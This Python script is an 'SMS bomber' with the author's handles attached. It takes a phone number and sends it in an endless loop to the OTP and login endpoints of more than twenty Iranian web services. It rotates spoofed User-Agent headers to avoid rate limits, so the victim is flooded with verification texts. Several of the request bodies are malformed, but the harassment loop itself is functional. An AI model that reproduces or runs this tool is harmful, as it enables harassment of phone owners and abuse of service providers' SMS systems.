import requests
import random
import time
import colored
from http import HTTPStatus



ascii_sms = '''
☠SMS BOMBER☠        
══════SMS══════
'''
print(ascii_sms)




print("This sms bomber was made by Amir")


print("telegram:   https://t.me/CYBER_CYr_a")

print("instagram:MR_TURBO_A ")

print("  ")
print("  ")

print("TURBO SMS BOMBER")
print("  ")
print("sms bomber   V1.1")

print("  ")





number = input("Inter your phone number (without 0) : ")
url_divar= "https://api.divar.ir/v5/auth/authenticate"
json_divar= {"phone":number}

url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp= {"cellphone":"+98" + number}


url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
json_sf= {"cellphone":"0" + number}

url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh= {"username":"0" + number}

url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba= {"phoneNumber":"+98" + number}

url_cinma= "https://cinematicket.org/api/v1/users/signup"
json_cinma= {"phone_number":"98" + number}

url_digikala= "https://api.digikala.com/v1/user/authenticate/"
json_digikala= {"backUrl":"/","username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

url_telewebion= "https://auth.telewebion.com/user/authenticate"
json_telewebion= {"field":"+98","type":"mobile" + number}

url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_sb= {"phoneNumber":"0" + number}

url_tpsi= "https://api.tapsi.cab/api/v2/user"
json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}

url_flo= "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
json_flo= {"field":"+98","type":"mobile" + number}

 
url_trop= "https://api.torob.com/v4/user/phone/send-pin/?phone_number="
json_trop= {"phone_number="}


url_fra= "https://api.faradars.org/api/client/v1/layout"
json_fra= {"phone_number":"98" + number}


url_fda=  "https://api.esam.ir/api/account/v2/RegisterOrLogin"
json_fda= {"phone":number}


url_sl= "https://khabarchin.basalam.com/api_v1.0/web/action/logs"
json_sl= {"phoneNumber" "+98" + number}

url_mar= "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
json_mar= {"phonr":number}

url_of= "https://www.okcs.com/users/mobilelogin"
json_of= {"phone":"0" + number}


url_ap= "https://www.google-analytics.com/g/collect?v=2&tid=G-LPY5GQ56EL&gtm=45je45k0v879009488za200&_p=1716471018637&gcd=13l3l3l3l1&npa=0&dma=0&cid=621528072.1710330426&ul=en-us&sr=1600x900&uaa=x86&uab=64&uafvl=Chromium%3B124.0.6367.91%7CGoogle%2520Chrome%3B124.0.6367.91%7CNot-A.Brand%3B99.0.0.0&uamb=0&uam=&uap=Windows&uapv=10.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEA&_s=2&sid=1716471014&sct=2&seg=1&dl=https%3A%2F%2Fabadis.ir%2Fuser%2Fregister%2F&dr=https%3A%2F%2Fabadis.ir%2Fuser%2Flogin%2F&dt=%D8%AB%D8%A8%D8%AA%20%D9%86%D8%A7%D9%85%20%D8%AF%D8%B1%20%D8%B3%D8%A7%DB%8C%D8%AA&en=scroll&epn.percent_scrolled=90&_et=4&tfd=5081"
json_ap= {"phone":number}

url_ka= "https://www.karlancer.com/api/register"
json_ka= {"phone":number}

url_jem= "https://rahavard365.com/api/v2/login-requests"
json_jem= {"cellphone":number}

url_po=  "https://api.ponisha.ir/api/v1/auth/register"
json_po= {"mobile: 09121234567" : number}







heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]




while True:
    random_head = random.choice(heads)
    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req)

    req1 = requests.post(url= url_snapp,json=json_snapp,headers=random_head)
    print(req1)

    req2 = requests.post(url= url_sf,json=json_sf,headers=random_head)
    print(req2)

    req3 = requests.post(url= url_sh,json=json_sh,headers=random_head)
    print(req3)

    req4 = requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
    print(req4)

    req5 = requests.post(url= url_cinma,json=json_cinma,headers=random_head)
    print(req5)
    req6 = requests.post(url= url_digikala,json=json_digikala,headers=random_head)
    print(req6)

    req7 = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print(req7)

    req8 = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print(req8)

    req9 = requests.post(url= url_aparat,json=json_aparat,headers=random_head)
    print(req9)

    req10 = requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
    print(req10)

    req11 = requests.post(url= url_sb,json=json_sb,headers=random_head)
    print(req11)

    req12 = requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
    print(req12)


    req13 = requests.post(url= url_flo,json=json_flo,headers=random_head)
    print(req13)

    req14 = requests.post(url= url_trop,json=json_trop,headers=random_head)
    print(req14)


    req15 = requests.post(url= url_fda,json=json_fda,headers=random_head)
    print(req15)


    req16 = requests.post(url= url_sl,json=json_sl,headers=random_head)
    print(req16)

    req17 = requests.post(url= url_mar,json=json_mar,headers=random_head)
    print(req17)

    req18 = requests.post(url= url_of,json=json_of,headers=random_head)
    print(req18)

    req19 = requests.post(url= url_ap,json=json_ap,headers=random_head)
    print(req19)

    req20 = requests.post(url= url_ka,json=json_ka,headers=random_head)
    print(req20)
    
    req21 = requests.post(url= url_jem,json=json_jem,headers=random_head)
    print(req21)

    req22 = requests.post(url= url_po,json=json_po,headers=random_head)
    print(req22)
    





    

    












    time.sleep(1)

